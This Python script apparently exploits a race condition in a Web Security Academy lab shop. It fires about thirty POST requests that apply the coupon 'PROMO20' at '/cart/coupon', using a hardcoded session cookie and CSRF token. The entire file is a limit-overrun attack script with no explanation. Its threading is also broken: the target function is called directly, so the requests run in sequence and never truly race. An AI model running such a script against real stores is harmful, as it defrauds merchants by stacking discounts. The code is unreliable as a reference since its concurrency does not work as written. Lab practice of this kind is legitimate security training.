import requests,threading,sys

def race_req(url):
    session = requests.session()
    url += "/cart/coupon"
    cookies = {"session": "2JyPKK1XlGQJ56U6uodbsUPOv8PaXUO6"}
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://0a9600cc04b222b481412f4b000400bd.web-security-academy.net", "Referer": "https://0a9600cc04b222b481412f4b000400bd.web-security-academy.net/cart", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Sec-Gpc": "1", "Te": "trailers"}
    data = {"csrf": "bcIkyTCb4lCfjV673IoXPycn1YVY4mJN", "coupon": "PROMO20"}
    r = session.post(url, headers=headers, cookies=cookies, data=data)
    print(r.text)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    url = sys.argv[1]
    for i in range(30):
        threading.Thread(target=race_req(url=url)).start()
    
if __name__ == "__main__":
    main()
    

